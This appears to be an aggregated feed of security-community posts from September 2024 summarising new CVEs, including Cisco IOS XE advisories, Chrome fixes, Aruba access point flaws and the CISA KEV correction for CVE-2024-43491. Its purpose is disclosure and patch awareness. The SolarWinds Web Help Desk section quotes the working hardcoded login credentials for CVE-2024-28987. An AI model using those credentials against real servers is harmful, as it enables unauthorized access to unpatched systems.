##
screaminggoat at 2024-09-25T16:31:31.295Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they drop 15 new security advisories:

  • Cisco IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20437 (8.1 high)
  • Cisco Catalyst SD-WAN Routers Denial of Service Vulnerability CVE-2024-20455 (8.6 high)
  • Cisco IOS and IOS XE Software Resource Reservation Protocol Denial of Service Vulnerability CVE-2024-20433 (8.6 high)
  • Cisco IOS XE Software Protocol Independent Multicast Denial of Service Vulnerability CVE-2024-20464 (8.6 high)
  • Cisco IOS XE Software SD-Access Fabric Edge Node Denial of Service Vulnerability CVE-2024-20480 (8.6 high)
  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

#Cisco #vulnerability #CVE

(7.5 HIGH)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

5 posts

A vulnerability in the SSH server of Cisco Catalyst Center, formerly Cisco DNA Center, could allow an unauthenticated, remote attacker to impersonate a Cisco Catalyst Center appliance. This vulnerability is due to the presence of a static SSH host key. An attacker could exploit this vulnerability by performing a machine-in-the-middle attack on SSH connections, which could allow the attacker to

##

CVE-2024-42505
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

3 posts

Command injection vulnerabilities in the underlying CLI service could lead to unauthenticated remote code execution by sending specially crafted packets destined to the PAPI (Aruba's Access Point management protocol) UDP port (8211). Successful exploitation of these vulnerabilities results in the ability to execute arbitrary code as a privileged user on the underlying operating system.

jbhall56 at 2024-09-26T12:30:38.441Z ##

The vulnerabilities (CVE-2024-42505, CVE-2024-42506, and CVE-2024-42507) can be exploited by sending specially crafted packets to the PAPI (Aruba’s Access Point management protocol) UDP port (8211) to get privileged access to execute arbitrary code on vulnerable devices. https://www.bleepingcomputer.com/news/security/hpe-aruba-networking-fixes-three-critical-rce-flaws-impacting-its-access-points/

##
patchnow24x7 at 2024-09-25T04:33:25.649Z ##

Advisory:
https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbnw04712en_us&docLocale=en_US

CVE-2024-20465
(5.8 MEDIUM)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

2 posts

A vulnerability in the access control list (ACL) programming of Cisco IOS Software running on Cisco Industrial Ethernet 4000, 4010, and 5000 Series Switches could allow an unauthenticated, remote attacker to bypass a configured ACL. This vulnerability is due to the incorrect handling of IPv4 ACLs on switched virtual interfaces when an administrator enables and disables Resilient Ethernet Protoc

1 repos

  • Cisco IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20437 (8.1 high)
  • Cisco Catalyst SD-WAN Routers Denial of Service Vulnerability CVE-2024-20455 (8.6 high)
  • Cisco IOS and IOS XE Software Resource Reservation Protocol Denial of Service Vulnerability CVE-2024-20433 (8.6 high)
  • Cisco IOS XE Software Protocol Independent Multicast Denial of Service Vulnerability CVE-2024-20464 (8.6 high)
  • Cisco IOS XE Software SD-Access Fabric Edge Node Denial of Service Vulnerability CVE-2024-20480 (8.6 high)
  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

#Cisco #vulnerability #CVE

##

CVE-2024-45817
(0 None)

EPSS: 0.04%

updated 2024-09-26T13:32:02.803000

2 posts

In x86's APIC (Advanced Programmable Interrupt Controller) architecture, error conditions are reported in a status register. Furthermore, the OS can opt to receive an interrupt when a new error occurs. It is possible to configure the error interrupt with an illegal vector, which generates an error when an error interrupt is raised. This case causes Xen to recurse through vlapic_error(). The re

screaminggoat at 2024-09-25T16:12:56.029Z ##

Citrix security advisory: XenServer and Citrix Hypervisor Security Update for CVE-2024-45817

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

#Citrix #vulnerability #CVE #CVE_2024_45817 #CVE_2022_24805 #CVE_2022_24809

##
screaminggoat@infosec.exchange at 2024-09-25T16:12:56.000Z ##

Citrix security advisory: XenServer and Citrix Hypervisor Security Update for CVE-2024-45817

  • CVE-2024-45817 (score pending, disclosed today) affects both XenServer 8 and Citrix Hypervisor 8.2 CU1 LTSR: a malicious administrator of a guest VM can cause the host to crash or become unresponsive.
  • CVE-2022-24805 (6.5 medium) net-snmp: A buffer overflow in the handling of the INDEX of NET-SNMP-VACM-MIB can cause an out-of-bounds memory access. affects XenServer 8
  • CVE-2022-24809 (6.5 medium) net-snmp: A malformed OID in a SET request to NET-SNMP-AGENT-MIB::nsLogTable can cause a NULL pointer dereference. Affects XenServer 8

No mention of exploitation. See CISA cybersecurity advisory: Citrix Releases Security Updates for XenServer and Citrix Hypervisor

CVE-2024-9122
(8.8 HIGH)

EPSS: 0.04%

updated 2024-09-25T18:32:27

3 posts

Type Confusion in V8 in Google Chrome prior to 129.0.6668.70 allowed a remote attacker to perform out of bounds memory access via a crafted HTML page. (Chromium security severity: High)

screaminggoat at 2024-09-27T00:04:26.838Z ##

@browserversiontracker
I'm not seeing an updated edge release notes https://learn.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security

but they did create security advisories to reflect that they did release a new version to patch against 4 vulnerabilities from Tuesday first announced by Google: https://chromereleases.googleblog.com/2024/09/stable-channel-update-for-desktop_24.html

  • CVE-2024-9120 Use after free in Dawn
  • CVE-2024-9121 Inappropriate implementation in V8
  • CVE-2024-9122 Type Confusion in V8
  • CVE-2024-9123 Integer overflow in Skia
##

  • CVE-2024-9123 Integer overflow in Skia
##
screaminggoat@infosec.exchange at 2024-09-24T18:16:54.000Z ##

Google security advisory: Stable Channel Update for Desktop
New Google Chrome version 129.0.6668.70/.71 for Windows, Mac and 129.0.6668.70 for Linux. Five security fixes, 4 externally reported:

  • CVE-2024-9120 (high) Use after free in Dawn
  • CVE-2024-9121 (high) Inappropriate implementation in V8
  • CVE-2024-9122 (high) Type Confusion in V8
  • CVE-2024-9123 (high) Integer overflow in Skia

No mention of exploitation. Excelsior!

#google #chrome #chromium #patchtuesday #vulnerability #CVE

CVE-2024-20467
(8.6 HIGH)

EPSS: 0.05%

updated 2024-09-25T18:31:27

3 posts

A vulnerability in the implementation of the IPv4 fragmentation reassembly code in Cisco IOS XE Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability is due to improper management of resources during fragment reassembly. An attacker could exploit this vulnerability by sending specific sizes of fragmented pa

  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

CVE-2024-20464
(8.6 HIGH)

EPSS: 0.04%

updated 2024-09-25T18:31:27

3 posts

A vulnerability in the Protocol Independent Multicast (PIM) feature of Cisco IOS XE Software could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability is due to insufficient validation of received IPv4 PIMv2 packets. An attacker could exploit this vulnerability by sending a crafted PIMv2 packet to a PIM-enabled interfac

  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

#Cisco #vulnerability #CVE

CVE-2024-20436
(8.6 HIGH)

EPSS: 0.04%

updated 2024-09-25T18:31:27

3 posts

A vulnerability in the HTTP Server feature of Cisco IOS XE Software when the Telephony Service feature is enabled could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability is due to a null pointer dereference when accessing specific URLs. An attacker could exploit this vulnerability by sending crafted HTTP traffic to an

updated 2024-09-25T18:31:27

2 posts

A vulnerability in the UDP packet validation code of Cisco SD-WAN vEdge Software could allow an unauthenticated, adjacent attacker to cause a denial of service (DoS) condition on an affected system. This vulnerability is due to incorrect handling of a specific type of malformed UDP packet. An attacker in a machine-in-the-middle position could exploit this vulnerability by sending crafted UDP pack

CVE-2024-7023
(8.0 HIGH)

EPSS: 0.04%

updated 2024-09-25T03:31:40

2 posts

Insufficient data validation in Updater in Google Chrome prior to 128.0.6537.0 allowed a remote attacker to perform privilege escalation via a malicious file. (Chromium security severity: Medium)

itm4n at 2024-10-02T11:13:18.709Z ##

Another cool blog post by @sploutchy (Compass Security)

"COM Cross-Session Activation"

Quick read, and straight to the point. This article provides a real-life example (Google Updater service here) showing one way to exploit a COM class for local privilege escalation on Windows. 👌

👉 https://blog.compass-security.com/2024/10/com-cross-session-activation/

#windows #vulnerability #privesc #cve #CVE_2024_7023

(7.1 HIGH)

EPSS: 0.04%

updated 2024-09-25T03:30:47

3 posts

Integer overflow in Skia in Google Chrome prior to 129.0.6668.70 allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page. (Chromium security severity: High)

screaminggoat at 2024-09-27T00:04:26.838Z ##

@browserversiontracker
I'm not seeing an updated edge release notes https://learn.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security

but they did create security advisories to reflect that they did release a new version to patch against 4 vulnerabilities from Tuesday first announced by Google: https://chromereleases.googleblog.com/2024/09/stable-channel-update-for-desktop_24.html

  • CVE-2024-9120 Use after free in Dawn
  • CVE-2024-9121 Inappropriate implementation in V8
  • CVE-2024-9122 Type Confusion in V8
  • CVE-2024-9123 Integer overflow in Skia

screaminggoat@infosec.exchange at 2024-09-24T18:16:54.000Z ##

Google security advisory: Stable Channel Update for Desktop
New Google Chrome version 129.0.6668.70/.71 for Windows, Mac and 129.0.6668.70 for Linux. Five security fixes, 4 externally reported:

  • CVE-2024-9120 (high) Use after free in Dawn
  • CVE-2024-9121 (high) Inappropriate implementation in V8
  • CVE-2024-9122 (high) Type Confusion in V8
  • CVE-2024-9123 (high) Integer overflow in Skia

No mention of exploitation. Excelsior!

#google #chrome #chromium #patchtuesday #vulnerability #CVE

##

CVE-2024-42259
(5.5 MEDIUM)

EPSS: 0.04%

updated 2024-09-25T03:30:36

1 posts

In the Linux kernel, the following vulnerability has been resolved: drm/i915/gem: Fix Virtual Memory mapping boundaries calculation Calculating the size of the mapped area as the lesser value between the requested size and the actual size does not consider the partial mapping offset. This can cause page fault access. Fix the calculation of the starting and ending addresses, the total size is no

jann@infosec.exchange at 2024-09-23T15:01:25.000Z ##

back in 2013, @sima published a i915/GEM Crashcourse explaining the Linux kernel i915 GPU driver; I read that earlier this year, and it was really helpful for understanding what is going on in the i915 code and understanding the context of CVE-2024-42259.

I think without that explainer, it would have taken me a long time to understand what GTT MMIO mappings are. The idea that some physical address region owned by the GPU proxies physical memory accesses based on GPU page tables is pretty mindblowing...

CVE-2024-45489
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-20T21:32:46

6 posts

Arc before 2024-08-26 allows remote code execution in JavaScript boosts. Boosts that run JavaScript cannot be shared by default; however, it is possible to create or update a boost using another user's ID. This installs the boost in the victim's browser and runs arbitrary Javascript on that browser in a privileged context.

jakeyounglol@mastodon.social at 2024-10-04T15:22:04.000Z ##

##
avoidthehack@infosec.exchange at 2024-09-23T14:40:56.000Z ##

Researcher reveals ‘catastrophic’ #security flaw in the Arc browser

(CVE-2024-45489)

The Arc Browser is a fork of #chromium with a lot of built-in features and integrations... and requires an account to use.

Arc Browser uses Firebase to store user information for features like Arc Boosts. Arc Boosts can contain arbitrary javascript... with knowing the CreatorID, an attacker could inject code into other users' browsing sessions.

Crazy to me because this implementation appeared to rely solely on user-provided identities (the CreatorID) without implementing any checks.

They've fixed the issue and are apparently implementing mitigations + moving off Firebase for "future features."

#browsers #cybersecurity #cve

https://www.theverge.com/2024/9/20/24249919/arc-browser-boost-firebase-vulnerability-patched

screaminggoat at 2024-09-25T16:31:31.295Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they drop 15 new security advisories:

  • Cisco IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20437 (8.1 high)
  • Cisco Catalyst SD-WAN Routers Denial of Service Vulnerability CVE-2024-20455 (8.6 high)
  • Cisco IOS and IOS XE Software Resource Reservation Protocol Denial of Service Vulnerability CVE-2024-20433 (8.6 high)
  • Cisco IOS XE Software Protocol Independent Multicast Denial of Service Vulnerability CVE-2024-20464 (8.6 high)
  • Cisco IOS XE Software SD-Access Fabric Edge Node Denial of Service Vulnerability CVE-2024-20480 (8.6 high)
  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

#Cisco #vulnerability #CVE

##

CVE-2024-43491
(9.8 CRITICAL)

EPSS: 0.14%

updated 2024-09-10T18:30:54

10 posts

Microsoft is aware of a vulnerability in Servicing Stack that has rolled back the fixes for some vulnerabilities affecting Optional Components on Windows 10, version 1507 (initial version released July 2015). This means that an attacker could exploit these previously mitigated vulnerabilities on Windows 10, version 1507 (Windows 10 Enterprise 2015 LTSB and Windows 10 IoT Enterprise 2015 LTSB) syst

screaminggoat at 2024-10-02T14:28:30.747Z ##

@habr CVE-2024-43491 is technically not an exploited zero-day. The vulnerability was triggered which led to exploitation of other known vulnerabilities instead. CISA removed CVE-2024-43491 from the KEV Catalog based on that clarification.

##
screaminggoat at 2024-09-26T17:26:42.288Z ##

@cR0w @campuscodi

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components. As a result, any Optional Component that was serviced with updates released since March 12, 2024 (KB5035858) was detected as "not applicable" by the servicing stack and was reverted to its RTM version.

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.
In addition, the Windows product team at Microsoft discovered this issue, and we have seen no evidence that it is publicly known.

The CVE-2024-43491 vulnerability caused systems to be vulnerable to older known bugs that did get exploited, hence the "exploited" flag. I don't have the exact details, but Microsoft provided CISA with a list of known exploited vulnerabilities right before Patch Tuesday, and when CISA found out that this wasn't really exploited, they reached out to Microsoft for clarification.

##
screaminggoat at 2024-09-26T17:13:40.330Z ##

CISA quietly removed CVE-2024-43491 (9.8 critical, disclosed 10 September 2024 by Microsoft) Microsoft Windows Update Remote Code Execution Vulnerability from the Known Exploited Vulnerabilities (KEV) Catalog. This is because Microsoft includes the verbiage in their Frequently Asked Questions (FAQ) section: "Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So on the one hand, they marked it as exploited, but they clarified that the vulnerability itself wasn't exploited. Excelsior!

cc: @campuscodi

#CISA #knownexploitedvulnerabilitiescatalog #KEV #CVE_2024_43491 #microsoft #vulnerability #zeroday #eitw #activeexploitation

##
cedric@fosstodon.org at 2024-09-26T06:02:10.000Z ##

@adulau actually it started very low:

$ curl -s 'https://api.first.org/data/v1/epss?cve=cve-2024-43491&scope=time-series' | jq '.data[0]."time-series"[-1]'
{
"epss": "0.00712000",
"percentile": "0.80862000",
"date": "2024-09-11"
}

##
screaminggoat@infosec.exchange at 2024-09-26T17:26:42.000Z ##

@cR0w @campuscodi

Starting with the Windows security update released March 12, 2024 - KB5035858 (OS Build 10240.20526), the build version numbers crossed into a range that triggered a code defect in the Windows 10 (version 1507) servicing stack that handles the applicability of Optional Components. As a result, any Optional Component that was serviced with updates released since March 12, 2024 (KB5035858) was detected as "not applicable" by the servicing stack and was reverted to its RTM version.

This CVE documents the rollback of fixes that addressed vulnerabilities which affected some Optional Components for Windows 10 (version 1507). Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected.
In addition, the Windows product team at Microsoft discovered this issue, and we have seen no evidence that it is publicly known.

The CVE-2024-43491 vulnerability caused systems to be vulnerable to older known bugs that did get exploited, hence the "exploited" flag. I don't have the exact details, but Microsoft provided CISA with a list of known exploited vulnerabilities right before Patch Tuesday, and when CISA found out that this wasn't really exploited, they reached out to Microsoft for clarification.

##
screaminggoat@infosec.exchange at 2024-09-26T17:13:40.000Z ##

CISA quietly removed CVE-2024-43491 (9.8 critical, disclosed 10 September 2024 by Microsoft) Microsoft Windows Update Remote Code Execution Vulnerability from the Known Exploited Vulnerabilities (KEV) Catalog. This is because Microsoft includes the verbiage in their Frequently Asked Questions (FAQ) section: "Some of these CVEs were known to be exploited, but no exploitation of CVE-2024-43491 itself has been detected."

So on the one hand, they marked it as exploited, but they clarified that the vulnerability itself wasn't exploited. Excelsior!

CVE-2024-7923
(9.8 CRITICAL)

EPSS: 0.07%

updated 2024-09-05T21:38:32.257000

1 posts

An authentication bypass vulnerability has been identified in Pulpcore when deployed with Gunicorn versions prior to 22.0, due to the puppet-pulpcore configuration. This issue arises from Apache's mod_proxy not properly unsetting headers because of restrictions on underscores in HTTP headers, allowing authentication through a malformed header. This flaw impacts all active Satellite deployments (6.

zhenech@chaos.social at 2024-09-26T20:25:56.000Z ##

So sad that CVE-2024-7923 was only a 9.8 and I didn't do any wild announcements to stir everyone up…

j/k

Responsible disclosure can be annoying, but you either play by the rules or not.

##

CVE-2024-28987
(9.1 CRITICAL)

EPSS: 94.16%

updated 2024-08-22T00:31:11

5 posts

The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data.

## SolarWinds Web Help Desk: Critical Vulnerability Exploited

Exploit code released for CVE-2024-28987, highlighting urgent need for patching and security updates. #SolarWinds #Cybersecurity #Vulnerability #WebHelpDesk

https://www.helpnetsecurity.com/2024/09/29/week-in-review-windows-server-2025-gets-hotpatching-option-poc-for-solarwinds-whd-flaw-released/

jos1264@social.skynetcloud.site at 2024-09-25T15:15:03.000Z ##

PoC for critical SolarWinds Web Help Desk vulnerability released (CVE-2024-28987) https://www.helpnetsecurity.com/2024/09/25/cve-2024-28987-poc/ #vulnerability #Horizon3.ai #enterprise #government #SolarWinds #Don'tmiss #education #Hotstuff #News #SMBs #CVE #MSP #PoC

##
screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
jos1264@social.skynetcloud.site at 2024-09-25T15:15:03.000Z ##

PoC for critical SolarWinds Web Help Desk vulnerability released (CVE-2024-28987) https://www.helpnetsecurity.com/2024/09/25/cve-2024-28987-poc/ #vulnerability #Horizon3.ai #enterprise #government #SolarWinds #Don'tmiss #education #Hotstuff #News #SMBs #CVE #MSP #PoC

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".

CVE-2024-5932
(10.0 CRITICAL)

EPSS: 72.36%

updated 2024-08-20T03:32:30

2 posts

The GiveWP – Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to dele

CVE-2024-32896
(7.8 HIGH)

EPSS: 0.08%

updated 2024-08-14T21:34:16

2 posts

there is a possible way to bypass due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.

alextecplayz@techhub.social at 2024-10-04T21:57:56.000Z ##

@silmathoron Seemingly, yes. GrapheneOS claims that CVE-2024-32896 is the same as CVE-2024-29748 (https://www.bleepingcomputer.com/news/security/google-fixes-two-pixel-zero-day-flaws-exploited-by-forensics-firms/) - "CVE-2024-29745 refers to a vulnerability in the fastboot firmware used to support unlocking/flashing/locking," explained GOS on Twitter.

RARLabs WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive. The issue occurs because a ZIP archive may include a benign file (such as an ordinary .JPG file) and also a folder that has the same name as the benign file, and the contents of the folder (which may include executable content) are processed during an attempt to ac

screaminggoat at 2024-09-25T13:54:00.393Z ##

Cloudflare: Unraveling SloppyLemming’s Operations Across South Asia
Reference: CVE-2023-38831 (7.8 high, disclosed 23 August 2023 by Group-IB as an exploited zero-day, added to CISA's KEV Catalog 24 August 2023, has proof of concept) RARLAB WinRAR Code Execution Vulnerability

Cloudflare reports that an APT dubbed SloppyLemming (aka India-nexus Outrider Tiger) used multiple cloud service providers between late 2022 to present for ongoing cyber espionage operations targeting Pakistan, Sri Lanka, Bangladesh, and China. Industries targeted include government, law enforcement, energy, telecommunications, and technology entities. SloppyLemming displays a lack of operational security (OPSEC) allowing Cloudforce One insight into its tooling. The actor primarily targets Pakistani government, defense, telecommunications, technology, and energy sector organizations; SloppyLemming also targets Bangladesh, Sri Lanka, Nepal, and China.

Cloudflare describes SloppyLemming, that their phishing activity focuses on credential and token collection. They describe malware operations (which leverages CVE-2023-38831) and a separate infection chain. While Cloudflare helpfully provides PowerShell hunting scripts, Microsoft Sentinel rule, and a Splunk script, they put the indicators of compromise (including SHA256 hashes) into an IMAGE! If Cloudflare had their own threat actor name, it’d be SloppyCTI.

See related Security Week reporting: India-Linked Hackers Targeting Pakistani Government, Law Enforcement

